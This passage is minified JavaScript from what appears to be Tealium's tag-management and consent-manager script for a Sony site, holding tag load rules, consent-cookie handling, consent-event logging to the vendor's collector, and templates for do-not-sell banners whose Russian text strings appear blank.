tag.cond[34]||utag.cond[42]||utag.cond[32]||utag.cond[22],tcat:0,send:1,v:202205160918,wait:1,tid:17003},26:{load:utag.cond[44],tcat:0,send:1,v:202009071506,wait:1,tid:20010},27:{load:utag.cond[45]||utag.cond[46]||utag.cond[131],tcat:0,send:1,v:202105051232,wait:1,tid:20010},33:{load:utag.cond[50]||utag.cond[51]||utag.cond[52]||utag.cond[53],tcat:0,send:1,v:202009151027,wait:1,tid:20010},35:{load:utag.cond[49]||utag.cond[54],tcat:0,send:1,v:202205160918,wait:1,tid:20010},36:{load:utag.cond[57]||utag.cond[55]||utag.cond[130]||utag.cond[134],tcat:0,send:1,v:202205160918,wait:1,tid:20010},38:{load:utag.cond[63],tcat:0,send:1,v:202205160918,wait:1,tid:20010},39:{load:utag.cond[69]||utag.cond[64],tcat:0,send:1,v:202205160918,wait:1,tid:17003},40:{load:utag.cond[128]||utag.cond[154]||utag.cond[66]||utag.cond[67]||utag.cond[153]||utag.cond[70]||utag.cond[152]||utag.cond[150]||utag.cond[151]||utag.cond[149]||utag.cond[68],tcat:0,send:1,v:202207010735,wait:1,tid:20010},42:{load:utag.cond[50]||utag.cond[45]||utag.cond[51]||utag.cond[78]||utag.cond[46]||utag.cond[131]||utag.cond[52]||utag.cond[44],tcat:0,send:1,v:202105051232,wait:1,tid:20010},73:{load:utag.cond[116],tcat:0,send:1,v:202205160918,wait:1,tid:20010},75:{load:utag.cond[121]||utag.cond[117]||utag.cond[118]||utag.cond[120]||utag.cond[119],tcat:0,send:1,v:202205160918,wait:1,tid:20010},76:{load:utag.cond[77]||utag.cond[76]||utag.cond[122]||utag.cond[74]||utag.cond[75]||utag.cond[161],tcat:0,send:1,v:202207010735,wait:1,tid:7129},83:{load:utag.cond[77]||utag.cond[76]||utag.cond[73]||utag.cond[124]||utag.cond[119],tcat:0,send:1,v:202207010735,wait:1,tid:7110},90:{load:utag.cond[126],tcat:0,send:1,v:202207010735,wait:1,tid:7133},91:{load:utag.cond[77]||utag.cond[76]||utag.cond[73]||utag.cond[124]||utag.cond[127],tcat:0,send:1,v:202207010735,wait:1,tid:7110},96:{load:utag.cond[135],tcat:0,send:1,v:202205160918,wait:1,tid:20010},97:{load:utag.cond[136],tcat:0,send:1,v:202205160918,wait:1,tid:20010},101:{load:utag.cond[156],tcat:0,send:1,v:202109161018,wait:1,tid:20010},103:{load:utag.cond[157],tcat:0,send:1,v:202205160918,wait:1,tid:7132}},utag.loader.cfgsort=["8","19","22","25","26","27","33","35","36","38","39","40","42","73","75","76","83","90","91","96","97","101","103"]},utag.loader.initcfg();try{utag.gdpr.applyConsentState()}catch(e){utag.DB(e)}},utag.gdpr={trackUIDs:[],consent_prompt:{noShow:!1,isEnabled:!1,content:{}},preferences_prompt:{single_cookie:!1,noShow:!1,isEnabled:!1,defaultState:!0,content:{},categories:{engagement:{id:13,enabled:1},misc:{id:9,enabled:1},analytics:{id:1,enabled:1},mobile:{id:12,enabled:1},monitoring:{id:14,enabled:1},search:{enabled:1,id:4},email:{id:5,enabled:1},display_ads:{enabled:1,id:3},social:{id:7,enabled:1},big_data:{enabled:1,id:8},personalization:{id:6,enabled:1},crm:{enabled:1,id:15},cdp:{id:11,enabled:1},affiliates:{id:2,enabled:1},cookiematch:{enabled:1,id:10}}},doNotSell:{noShow:!1,isEnabled:!0},getCategories:function(e){if(!utag.gdpr.preferences_prompt||!utag.gdpr.preferences_prompt.categories)return[];var t=utag.gdpr.keys(utag.gdpr.preferences_prompt.categories).length,a=new Array(t),o=utag.gdpr.preferences_prompt.categories;for(var i in o)if(o.hasOwnProperty(i)){var r=!0===o[i].enabled||1==o[i].enabled;e&&!r||(a[o[i].id-1]=i)}for(var n=a.length-1;n>=0;n--)void 0===a[n]&&a.splice(n,1);return a},getSelectedCategories:function(){var e,t=[],a=utag.gdpr.getCategories(),o=utag.gdpr.getConsentState();try{if("number"==typeof o)return 1===parseInt(o)?a:t;for(e in utag.loader.GV(o))"1"===o[e].ct&&t.push(a[e])}catch(e){utag.DB(e)}return t},getCategoryLanguage:function(e){if(!utag.gdpr.preferences_prompt||!utag.gdpr.preferences_prompt.categories)return[];var t=utag.gdpr.getLanguage(utag.gdpr.preferences_prompt);return utag.gdpr.preferences_prompt.languages[t].categories[e]},getConsentState:function(){var e=/^c\d+/,t=utag.gdpr.getCookieValues(),a=1,o=utag.gdpr.getCategories(),i=function(e){for(var t=[],a=0;a<e.length;a++)t.push({ct:null,name:e[a]});return t}(o),r=function(t){var a={};for(var o in t)t.hasOwnProperty(o)&&e.test(o)&&(a[o]=t[o]);return a}(t);for(var n in r=utag.gdpr.sortedObject(r,(function(e,t){var a=parseInt((e||"").substring(1),10),o=parseInt((t||"").substring(1),10);return isNaN(a)||isNaN(o)?0:a>o?1:-1})),utag.loader.GV(r))if(n.match(e)){var s=parseInt(n.substring(1),10)-1;o[s];i[s].ct=t[n],1*t[n]!=1&&(a=0)}return t.consent?!0===t.consent||"true"===t.consent?a||i:-1:0===a?i:0},getCookieValues:function(){var e={},t=function(){var e=("; "+document.cookie).split("; "+utag.gdpr.cookieNS+"=");if(2==e.length)return utag.ut.decode(e.pop().split(";").shift())}(),a="string"===utag.gdpr.typeOf(t)?t:"";if(utag.data&&a&&(utag.data["cp."+utag.gdpr.cookieNS]=a),a){var o,i,r=decodeURI(a).split("|");for(o=0;o<r.length;o++)e[(i=r[o].split(":"))[0]]=i[1]}return utag.gdpr.values=e,e},getDeTokenizedContent:function(e,t){if(utag.gdpr.isEmpty(e))return null;var a=/{{(.*?)}}/gm,o=/[{}]/g,i=/display_ads|big_data/,r=utag.gdpr.getLanguage(e,t),n=utag.gdpr.clone(e.languages[r]);for(var s in utag.gdpr.sortedObject(n.common_tokens))n.common_tokens.hasOwnProperty(s)&&(n.common_tokens[s]=c(n.common_tokens[s]));for(var d in utag.gdpr.sortedObject(n.custom_tokens))n.custom_tokens.hasOwnProperty(d)&&(n.custom_tokens[d]=c(n.custom_tokens[d]));function c(e){if(!e)return e;var t=e.match(a);if(!t)return e;for(var r=0;r<t.length;r++){var s=t[r].replace(o,"")||"",d=new RegExp(t[r],"g");if(n.common_tokens[s])e=e.replace(d,n.common_tokens[s]);else if(n.custom_tokens[s])e=e.replace(d,n.custom_tokens[s]);else if(n.categories&&s.indexOf("category_")>-1){var c=s.split("_");s.match(i)&&(c[1]=c[1]+"_"+c[2],c.splice(2,1));var l=n.categories[c[1]],u={title:"name",description:"notes"}[c[2]];l[u]&&(e=e.replace(d,l[u]))}}return e}return{language:r,tokens:n,js:c(e.content.js),html:c(e.content.html),css:c(e.content.css)}},getLanguage:function(e,t){var a=window.utag.udoname||"utag_data",o=window.utag.data||window[a],i=(t||o[window.utag.cfg.gdprDLRef]||navigator.languages&&navigator.languages[0]||navigator.language||navigator.userLanguage).toLowerCase(),r=(i||"").split("-")[0];if(!e)return i;var n=e.languages;return n[i]?i:n[r]?r:e.defaultLang},getTokenLanguage:function(e,t,a){if(utag.gdpr.isEmpty(e))return null;if(utag.gdpr.isEmpty(t))return null;var o=utag.gdpr.getDeTokenizedContent(e,a),i=o.tokens;if(a&&o.language!==a)return null;if(utag.gdpr.isEmpty(i))return null;if(i.common_tokens[t])return i.common_tokens[t];if(i.custom_tokens[t])return i.custom_tokens[t];if(i.categories&&t.indexOf("category_")>-1){var r=t.split("_"),n=i.categories[r[1]];if(n[r[2]])return n[r[2]]}return null},refreshCookie:function(){utag&&utag.DB&&utag.DB("utag.gdpr.refreshCookie has been deprecated")},setCookie:function(e){if(utag.DB("Consent Manager: Set Cookie"),"object"===utag.gdpr.typeOf(e)&&0!==utag.gdpr.keys(e).length){var t=utag.gdpr.typeOf(e.consent);if("number"===t&&(e.consent=1==e.consent,t=utag.gdpr.typeOf(e.consent)),"boolean"===t||"string"===t&&("true"===e.consent.toLowerCase()||"false"===e.consent.toLowerCase())){"number"===utag.gdpr.typeOf(e.ts)&&13===e.ts.toString().length||(e.ts=(new Date).getTime()),utag.gdpr.values=e;var a=[];for(var o in utag.loader.GV(e))/^(consent|dns|ts|c\d+)$/.test(o)?a.push(o+":"+e[o]):utag.DB("Invalid option sent to setCookie ["+o+"], is unknown");var i=utag.gdpr.consentPeriod;if(!i){var r=null==e.dns?12:13,n=new Date;n.setMonth(n.getMonth()+r),i=Math.ceil((n.getTime()-(new Date).getTime())/864e5)}var s=new Date(e.ts);s.setDate(s.getDate()+i);var d=[utag.gdpr.cookieNS+"="+encodeURI(a.join("|")),"path="+utag.gdpr.path,"expires="+s.toGMTString()];utag.gdpr.domain&&d.push("domain="+utag.gdpr.domain),document.cookie=d.join("; "),utag.data["cp."+utag.gdpr.cookieNS]=a.join("|")}else utag.DB("Invalid option sent to setCookie [consent must be true/false]")}},defaultConsentForDoNotSell:function(e,t){"dns"===e&&("undefined"===utag.gdpr.typeOf(t.consent)&&(utag.DB("Consent Manager: Defaulting missing consent for Do Not Sell."),t.consent="true"));return t},setCookieValue:function(e,t){if(utag.DB("Consent Manager: Set Cookie Value"),e&&"undefined"!==utag.gdpr.typeOf(t)&&"null"!==utag.gdpr.typeOf(t)){var a=utag.handler.C(utag.gdpr.getCookieValues());a[e]=t,a=utag.gdpr.defaultConsentForDoNotSell(e,a),utag.gdpr.setCookie(a)}},setConsentValue:function(e){utag.DB("Consent Manager: Set Consent Value: "+e);var t={true:1,true:1,1:1,false:0,false:0,0:0};if(!t.hasOwnProperty(e))throw new Error("No response supplied");var a=1===t[e];utag.gdpr.setCookieValue("ts",(new Date).getTime()),utag.gdpr.setCookieValue("consent",a),utag.gdpr.processQueue(a);var o=new XMLHttpRequest;o.open("POST","https://collect.tealiumiq.com/event"),a?o.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"grant_full_consent","consent_categories":"'+utag.gdpr.getCategories(!0).join(", ")+'","policy":"gdpr", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}'):o.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"decline_consent","consent_categories":"","policy":"gdpr", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}')},setPreferencesValues:function(e,t){utag.DB("Consent Manager: Set Preferences Values");var a,o,i=utag.gdpr.getCookieValues(),r={},n=/\D/,s=utag.gdpr.getCategories(),d=[],c=!1,l=!1,u=/c\d/;if("object"===utag.gdpr.typeOf(e)){try{for(a=0;a<s.length;a++)r[s[a]]="c"+(a+1);for(var g in e)e.hasOwnProperty(g)&&("1"!==e[g]&&"0"!==e[g]&&1!==e[g]&&0!==e[g]||(g.match(n)?(i[r[g]]=e[g],0!=e[g]&&d.push(g)):(i["c"+g]=e[g],0!=e[g]&&d.push(s[g-1]))));for(o in utag.loader.GV(i))o.match(u)&&(0!=i[o]?c=!0:l=!0);i.ts=(new Date).getTime(),i.consent=c,utag.gdpr.setCookie(i),utag.gdpr.processQueue(c)}catch(e){utag.DB(e)}if(!t){var p=new XMLHttpRequest;p.open("POST","https://collect.tealiumiq.com/event"),l?c?p.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"grant_partial_consent","consent_categories":"'+d.join(",")+'","policy":"gdpr", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}'):p.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"decline_consent","consent_categories":"","policy":"gdpr", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}'):!l&&c&&p.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"grant_full_consent","consent_categories":"'+utag.gdpr.getCategories(!0).join(", ")+'","policy":"gdpr", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}')}}else utag.DB("Categories is not type object.")},setAllCategories:function(e,t){if(utag.DB("Consent Manager: Set Preferences All Categories: "+e),void 0!==e&&"boolean"===utag.gdpr.typeOf(e)){for(var a=utag.gdpr.getCategories(),o={},i=0;i<a.length;i++)o[""+(i+1)]=e?"1":"0";utag.gdpr.setPreferencesValues(o,t)}},setPreferencesFromList:function(e){utag.DB("Consent Manager: Set Preferences From List");var t={},a=utag.gdpr.getCategories();if("array"===utag.gdpr.typeOf(e)){for(var o=0;o<e.length;o++)t[e[o]]="1";for(var i=0;i<a.length;i++)t[a[i]]||(t[a[i]]="0");utag.gdpr.setPreferencesValues(t)}else utag.DB("List should be of type array")},processQueue:function(e){if(utag.DB("Consent Manager: Processing Consent Queue"),!utag.gdpr.noqueue)if(e){utag.DB("Consent Manager: Processing Consent Queue Length: "+utag.gdpr.queue.length);var t,a,o={};utag.gdpr.merge(o,utag.cond);for(var i=0;i<utag.gdpr.queue.length;i++){if(!(t=utag.gdpr.queue[i]).cfg||!t.cfg.uids){for(var r in a={},utag.loader.RD(a,t.event),utag.gdpr.merge(a,t.data,!0),o)o.hasOwnProperty(r)&&(o[r]=0);utag.handler.RE(t.event,a,"blr"),utag.loader.loadrules(a,o),t.cfg=t.cfg||{},t.cfg.uids=[],t.data=a,utag.cond=o,utag.loader.initcfg(),utag.gdpr.applyConsentState();var n=utag.gdpr.getConsentState(),s=utag.gdpr.typeOf(n);for(var d in utag.loader.GV(utag.loader.cfg))if(!utag.gdpr.omittedTags[d]){var c=utag.loader.cfg[d];c.load&&c.send&&(0!==c.tcat?("array"===s&&"1"==n[c.tcat-1].ct||"number"===s&&1==n)&&t.cfg.uids.push(d):0===c.tcat&&t.cfg.uids.push(d))}}t.cfg.uids&&(utag.gdpr.trackUIDs=utag.gdpr.trackUIDs.concat(t.cfg.uids)),utag.track_old.call(this,t)}utag.gdpr.queue=[]}else utag.gdpr.queue=[]},typeOf:function(e){return{}.toString.call(e).match(/\s([a-zA-Z]+)/)[1].toLowerCase()},merge:function(e,t,a,o){if(a)for(o in utag.loader.GV(t))e[o]=t[o];else for(o in utag.loader.GV(t))void 0===e[o]&&(e[o]=t[o])},shouldTagFire:function(e){if(!e&&"array"!==utag.gdpr.typeOf(utag.gdpr.trackUIDs))return!0;var t=utag.loader.cfg,a=utag.gdpr.getConsentState(),o=e||utag.gdpr.trackUIDs.shift();if("undefined"===utag.gdpr.typeOf(o))return!0;utag.DB("Consent Manager: Applying consent: "+o);var i=utag.gdpr.typeOf(a),r=t[o],n=utag.gdpr.dns?utag.gdpr.dns.getBlockedDnsTagLookup():{};if(!utag.gdpr.omittedTags[o]&&r.send&&0!==r.tcat){if("array"===i&&"1"==a[r.tcat-1].ct||"number"===i&&1==a||1===parseInt(n[o]))return utag.DB("Consent Manager: Applying consent: "+o+" allowed to send"),!1}else if((utag.gdpr.omittedTags[o]||0==r.tcat)&&r.send)return utag.DB("Consent Manager: Omitted Tag: "+o+" allowed to send"),!1;return utag.DB("Consent Manager: Applying consent: "+o+" not allowed to send"),!0},applyConsentState:function(){utag.DB("Consent Manager: Applying consent");try{var e,t=utag.loader.cfg,a=utag.gdpr.getConsentState(),o=utag.gdpr.omittedTags;if("number"==typeof a){if(utag.gdpr.consent_prompt.isEnabled&&1!==parseInt(a)||!utag.gdpr.consent_prompt.isEnabled&&utag.gdpr.preferences_prompt.isEnabled&&-1===parseInt(a))for(e in utag.DB("Consent Manager: Setting all tags to off"),utag.loader.GV(t))void 0===o[e]&&(t[e].load=0)}else if(utag.gdpr.consent_prompt.isEnabled||utag.gdpr.preferences_prompt.isEnabled)for(e in utag.DB("Consent Manager: Partial Consent"),utag.loader.GV(t))void 0===o[e]&&t[e].tcat>0&&"1"!=a[t[e].tcat-1].ct&&(t[e].load=0);var i=utag.gdpr.dns?utag.gdpr.dns.getBlockedDnsTagLookup():null;if(utag.DB("Consent Manager: Do Not Sell Tags"),i)for(e in utag.loader.GV(t))1===parseInt(i[e])&&(t[e].load=0)}catch(e){utag.DB(e)}},updateConsentCookie:function(e){utag.DB("Consent Manager: Updating consent cookie");var t,a=utag.gdpr.typeOf(e);if(0===(t="string"===a?e.split(/\s*,\s*/):"array"!==a?[]:e.slice()).length)return utag.gdpr.setConsentValue(!1),void utag.gdpr.setAllCategories(!1);utag.gdpr.setPreferencesFromList(t)},keys:function(e){if(Object.keys)return Object.keys(e);var t=[];for(var a in e)e.hasOwnProperty(a)&&t.push(a);return t},sortedObject:function(e,t){var a={};if(void 0!==e)for(var o=utag.gdpr.keys(e).sort(t),i=0;i<o.length;i++)a[o[i]]=e[o[i]];return a},clone:function(e){var t=0;return function e(a){var o,i={};if(5===++t)return a;for(o in utag.loader.GV(a))"array"===utag.gdpr.typeOf(a[o])?i[o]=a[o].slice(0):"object"===utag.gdpr.typeOf(a[o])?i[o]=e(a[o]):i[o]=a[o];return t--,i}(e)},isEmpty:function(e){switch(utag.gdpr.typeOf(e)){case"string":case"array":return 0===e.length;case"object":for(var t in e)if(e.hasOwnProperty(t))return!1;default:return!0}},queue:[],domain:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.domain||utag.cfg.domain,path:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.cookie_path||"/",noqueue:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.nogdprqueue||!1,noview:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.noview||!1,consentPeriod:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.consentPeriod||0,cookieNS:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.cmcookiens||"CONSENTMGR",eventProfile:window.utag_cfg_ovrd&&window.utag_cfg_ovrd.cmeventprofile||"main",omittedTags:{}},window.utag_cfg_ovrd&&""==window.utag_cfg_ovrd.domain&&(utag.gdpr.domain=""),utag.loader.initdataOld=utag.loader.initdata,utag.loader.initdata=function(){utag.loader.initdataOld(),0===utag.gdpr.getConsentState()&&(utag.gdpr.noview||utag.loader.rd_flag||utag.gdpr.noqueue||utag.gdpr.queue.push({event:"view",data:utag.handler.C(utag.data)}))},utag.gdpr.promptEnabledSetting=function(){utag.gdpr.dr||!utag.cfg.readywait&&!utag.cfg.waittimer?(utag.gdpr.consent_prompt.isEnabled,!0!==utag.gdpr.doNotSell.isEnabled||utag.cond[160]||(utag.gdpr.doNotSell.isEnabled=!1)):utag.gdpr.dr=1},utag.preOld=utag.pre,utag.pre=function(){utag.preOld(),utag.gdpr.promptEnabledSetting(),utag.pre=utag.preOld},utag.gdpr.dns={tagLookup:{90:"0",38:"0",101:"0",7:"0",25:"0",75:"0",64:"0",27:"0",42:"0",8:"0",73:"0",39:"0",22:"0",40:"0",41:"0",33:"0",28:"0",103:"0",20:"0",19:"0",83:"0",76:"0",97:"0",26:"0",35:"0",91:"0",96:"0",21:"0",36:"0"},getBlockedDnsTagLookup:function(){return"true"==utag.gdpr.getCookieValues().dns?utag.gdpr.dns.tagLookup:null},getDnsState:function(){return utag.gdpr.getCookieValues().dns},setDnsState:function(e){var t={true:"true",true:"true",1:"true",false:"false",false:"false",0:"false"};if(!t.hasOwnProperty(e))throw new Error("Invalid DNS state : "+e);var a=t[e];utag.gdpr.setCookieValue("dns",a);var o=new XMLHttpRequest;o.open("POST","https://collect.tealiumiq.com/event"),"true"==a?o.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"grant_partial_consent","do_not_sell":[],"consent_categories":"","policy":"ccpa", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}'):o.send('{"tealium_account":"sony-marketing","tealium_profile":"'+(utag.gdpr.eventProfile||"main")+'","tealium_event":"grant_full_consent","consent_categories":"","policy":"ccpa", "tealium_visitor_id" : "'+utag.data["cp.utag_main_v_id"]+'"}')}},utag.gdpr.doNotSell.banner=utag.gdpr.doNotSell.banner?utag.gdpr.doNotSell.banner:{},utag.gdpr.doNotSell.banner.languages={ru:{common_tokens:{cookie_statement_text:"  ,        ,   ,    -.           .",cookie_statement_url:"",privacy_policy_url:"https://www.sony.ru/electronics/cookie-policy.html",privacy_policy_text:" cookie",message:"    ",details_button:"",title:"  cookie   Sony",continue_button:""},custom_tokens:{},isDefault:"true"},en:{common_tokens:{cookie_statement_text:"  ,        ,   ,    -.           .",privacy_policy_url:"https://www.sony.ru/electronics/cookie-policy.html",cookie_statement_url:"",privacy_policy_text:" cookie",details_button:"",title:"  cookie   Sony",continue_button:"",message:"    "},isDefault:"false",custom_tokens:{}}},utag.gdpr.doNotSell.banner.content=utag.gdpr.doNotSell.banner.content?utag.gdpr.doNotSell.banner.content:{},utag.gdpr.doNotSell.banner.content.css='#__tealiumDNS_banner .privacy_prompt {     font-family: "SST W01 Roman","Helvetica Neue",Helvetica,Arial,sans-serif;    position: fixed;     bottom: 0;    text-align: left;     border: 1px solid #CCC;     border-radius: 4px;     background-color: #f1f5f9;     color: #444;     font-size: 14px;     z-index: 2147483647;    word-break: break-word;     line-height: 1.65;    padding-top: 2px;    padding-left: 5%;    padding-right: 5%;    width: 100%;  }     #__tealiumDNS_banner .privacy_prompt_title {     font-family: "SST W01 Roman","Helvetica Neue",Helvetica,Arial,sans-serif;    text-align: left;    font-size: 10pt;    line-height: 1.65;  }    #__tealiumDNS_banner .privacy_prompt_title h1 {      font-size: 10pt;      font-weight: bold;      margin-top: 6px;      font-family: verdana;      color: rgb(47, 53, 61);  }    #__tealiumDNS_banner .privacy_prompt p {      font-family: verdana;      text-align: left;      font-size: 8pt;      line-height: 1.2;      color: rgb(131, 131, 143);  }    #__tealiumDNS_banner .privacy_prompt a {     text-decoration: none;     color: #5d58f5;  }     #__tealiumDNS_banner .privacy_prompt a:hover {     color: #3c4c74;  }     #__tealiumDNS_banner .privacy_prompt_content {     font-size: 13px;     width: 80%;  }     #__tealiumDNS_banner  .privacy_prompt_footer {     padding: 6px auto;    width: 20%;   }     #__tealiumDNS_banner .privacy_prompt_footer a {     font-size: 0.9em;   }     #__tealiumDNS_banner .privacy_prompt_footer .button {      padding: 4px 12px;      cursor: pointer;      border: 1px solid rgb(0, 0, 0);      background: rgb(0, 0, 0);      color: rgb(255, 255, 255);      font-weight: normal;      font-size: 1em;      letter-spacing: 0.04em;      text-align: center;      margin: 0px auto 16px auto;      width:90px;  }      #__tealiumDNS_banner .privacy_prompt .button.left {     float: left;   }     #__tealiumDNS_banner .privacy_prompt > .close_btn_thick {     position: absolute;     display: block;     top: 10px;     right: 10px;     text-decoration: none;    cursor: pointer;  }     #__tealiumDNS_banner .privacy_prompt > .close_btn_thick:after {     content: "\\2716";    }     #__tealiumDNS_banner .privacy_prompt .logo {     float: right;   }     @media (max-width: 780px) {    #__tealiumDNS_banner  .privacy_prompt {        width: 100%;        margin: 0 auto;    }        #__tealiumDNS_banner .privacy_prompt_content {         width: 100%;    }           #__tealiumDNS_banner  .privacy_prompt_footer {         width: 100%;     }     }',utag.gdpr.doNotSell.banner.content.html='<div class="privacy_prompt consent_doNotSell">    <div class="privacy_prompt_title">      <h1>{{title}}</h1>    </div>    <div style="display: flex; flex-wrap: wrap;">        <div class="privacy_prompt_content">            <p>{{message}}            <a href="{{privacy_policy_url}}">{{privacy_policy_text}}</a>            {{cookie_statement_text}}            </p>        </div>            <div class="privacy_prompt_footer">            <div class="button right" id="consent_doNotSell_close">{{continue_button}}</div>        </div>    </div>      <div class="close_btn_thick"></div></div>',utag.gdpr.doNotSell.banner.content.js='(function consent_doNotSell(){var $modal=document.getElementById("__tealiumDNS_banner"),$continueBtn=document.getElementById("consent_doNotSell_close"),$closeXBtn=$modal.getElementsByClassName("close_btn_thick")[0];var callBack=function(){utag.gdpr.showDoNotSellPrompt();closePrompt();};var setDNSFalseClose=function(){utag.gdpr.dns.setDnsState(false);closePrompt();};var closePrompt=function(){$modal.style.display="none";utag.gdpr.dns.setDnsState(false);};if(document.addEventListener){$closeXBtn.addEventListener("click",closePrompt,false);$continueBtn.addEventListener("click",setDNSFalseClose,false);}else if(document.attachEvent){$closeXBtn.attachEvent("click",closePrompt);$continueBtn.attachEvent("click",setDNSFalseClose);}else{$closeXBtn.onclick=closePrompt;$continueBtn.onclick=setDNSFalseClose;}}());',utag.gdpr.doNotSell.defaultLang="ru",utag.gdpr.showDoNotSellBanner=function(e){var t="__tealiumDNSStyle_banner",a="__tealiumDNS_banner",o="__tealiumDNSScript_banner",i=document.getElementById(t);i&&i.parentNode.removeChild(i);var r=document.getElementById(a);r&&r.parentNode.removeChild(r);var n=document.getElementById(o);n&&n.parentNode.removeChild(n);var s=utag.gdpr.getDeTokenizedContent(utag.gdpr.doNotSell.banner,e),d=document.head||document.getElementsByTagName("head")[0],c=document.createElement("style"),l=document.createElement("div"),u=document.createElement("script"),g=document.body||document.getElementsByTagName("body")[0];c.type="text/css",c.id=t,c.styleSheet?c.styleSheet.cssText=s.css:c.appendChild(document.createTextNode(s.css)),d.appendChild(c),l.innerHTML=s.html,l.id=a,g.appendChild(l),u.language="javascript",u.type="text/javascript",u.text="try{"+s.js+"} catch(e){utag.DB(e)}",u.id=o,d.appendChild(u)},utag.gdpr.doNotSell.prompt=utag.gdpr.doNotSell.prompt?utag.gdpr.doNotSell.prompt:{},utag.gdpr.doNotSell.prompt.languages={ru:{common_tokens:{title:"",message:"",company_logo_url:"",confirmation_button:"",do_not_sell_description:""},isDefault:"true",custom_tokens:{}},en:{isDefault:"false",custom_tokens:{},common_tokens:{title:"",company_logo_url:"",message:"",confirmation_button:"",do_not_sell_description:""}}},utag.gdpr.doNotSell.prompt.content=utag.gdpr.doNotSell.prompt.content?utag.gdpr.doNotSell.prompt.content:{},utag.gdpr.doNotSell.prompt.content.css='#__tealiumDNS_prompt {  display: block;  position: fixed;  left: 0;  top: 0;  z-index: 9999;  width: 100%;  height: 100%;  padding-top: 5%;  background-color: black;  background-color: rgba(0, 0, 0, 0.4);  overflow: auto;}#__tealiumDNS_prompt .privacy_prompt {  display: block;  position: absolute;  width: 600px;  top: 100px;  left: 50%;  margin-left: -300px;  text-align: left;  border: 1px solid #CCC;  border-radius: 4px;  background-color: #FFF;  color: #444;  font-size: 14px;  z-index: 1000;  word-break: break-word;}#__tealiumDNS_prompt .privacy_prompt > .close_btn_thick {  position: absolute;  display: block;  top: 10px;  right: 10px;  text-decoration: none;  text-shadow: 0 1px 0 #fff;  color: #777;  font: 14px/100% arial, sans-serif;  cursor: pointer;}#__tealiumDNS_prompt .privacy_prompt > .close_btn_thick:after {  content: "\\2716";}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_content {  padding: 20px;  font-size: 0.9em;  background-color: white;  margin: auto;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_content a {  text-decoration: none;  color: #0077bf;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_content h1 {  font-size: 1.3em;  color: #444;  font-weight: 400;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_content img { float: right; }#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_footer {  padding: 0px 20px 20px 20px;  overflow: auto;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_footer a {  font-size: 0.9em;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_footer .button {  font-size: 1em;  border: 1px solid #CCC;  padding: 4px 15px;  min-width: 50px;  text-align: center;  border-radius: 4px;  background-color: #EEE;  box-shadow: inset 0px 1px 4px #ffffff;  text-shadow: 1px 1px 3px #ffffff;  color: #000;  cursor: pointer;  width:90px;}#__tealiumDNS_prompt .privacy_prompt .privacy_prompt_footer .button.right {  float: right;}@media (max-width: 780px) {  #__tealiumDNS_prompt #__tealiumGDPRcpPrefs .privacy_prompt {    width: 90%;    margin: 0 auto;    left: 5%;  }  #__tealiumDNS_prompt #__tealiumGDPRcpPrefs .privacy_prompt .privacy_prompt_content h1 {    text-align: center;  }}',utag.gdpr.doNotSell.prompt.content.html='<div class="privacy_prompt consent_doNotSell">    <div class="privacy_prompt_content">       <h1>{{title}}</h1>       <img src="{{company_logo_url}}" class="logo">       <p>{{message}}</p>       <input id=\'consent_doNotSell_checkbox\' type=\'checkbox\' />       {{do_not_sell_description}}   </div>   <div class="privacy_prompt_footer">       <div class="button right" id="consent_doNotSell_submit">{{confirmation_button}}</div>   </div>   <div class="close_btn_thick"></div></div>',utag.gdpr.doNotSell.prompt.content.js='(function consent_doNotSell(){var $el=document.getElementById("consent_doNotSell_submit"),$modal=document.getElementById("__tealiumDNS_prompt"),$closeBtn=$modal.getElementsByClassName("close_btn_thick")[0],$checkBox=document.getElementById("consent_doNotSell_checkbox");$checkBox.checked=(utag.gdpr.dns.getDnsState()=="true");var callBack=function(){utag.gdpr.dns.setDnsState($checkBox.checked);closePrompt();};var closePrompt=function(){$modal.style.display="none";};if(document.addEventListener){$el.addEventListener("click",callBack,false);$closeBtn.addEventListener("click",closePrompt,false);}else if(document.attachEvent){$el.attachEvent("click",callBack);$closeBtn.attachEvent("click",closePrompt);}else{$el.onclick=callBack;$closeBtn.onclick=closePrompt;}}());',utag.gdpr.doNotSell.defaultLang="ru",utag.gdpr.showDoNotSellPrompt=function(e){var t="__tealiumDNSStyle_prompt",a="__tealiumDNS_prompt",o="__tealiumDNSScript_prompt",i=document.getElementById(t);i&&i.parentNode.removeChild(i);var r=document.getElementById(a);r&&r.parentNode.removeChild(r);var n=document.getElementById(o);n&&n.parentNode.removeChild(n);var 